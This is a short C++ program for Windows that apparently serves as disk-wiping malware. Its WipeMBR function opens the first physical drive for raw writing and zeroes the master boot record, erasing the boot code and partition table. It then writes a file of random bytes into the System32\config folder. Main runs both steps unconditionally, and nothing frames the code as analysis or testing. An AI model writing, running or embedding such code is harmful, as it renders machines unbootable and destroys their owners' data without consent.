#define _WIN32_WINNT 0x0600
#include <windows.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <ctime>

bool WipeMBR() {
    HANDLE hDrive = CreateFileW(L"\\\\.\\PhysicalDrive0",
                                GENERIC_READ | GENERIC_WRITE,
                                FILE_SHARE_READ | FILE_SHARE_WRITE,
                                NULL, OPEN_EXISTING, 0, NULL);
    if (hDrive == INVALID_HANDLE_VALUE) return false;
    BYTE zeroSector[512] = {0};
    zeroSector[510] = 0x55;
    zeroSector[511] = 0xAA;
    DWORD bytesWritten;
    BOOL ret = WriteFile(hDrive, zeroSector, 512, &bytesWritten, NULL);
    CloseHandle(hDrive);
    return (ret && bytesWritten == 512);
}

bool CreateOSDATA() {
    char path[] = "C:\\Windows\\System32\\config\\OSDATA";
    FILE* f = fopen(path, "wb");
    if (!f) return false;
    srand((unsigned int)time(NULL));
    for (int i = 0; i < 1024; i++) {
        unsigned char ch = rand() % 256;
        fwrite(&ch, 1, 1, f);
    }
    fclose(f);
    return true;
}

int main()
{
    WipeMBR();
    CreateOSDATA();
    return 0;
}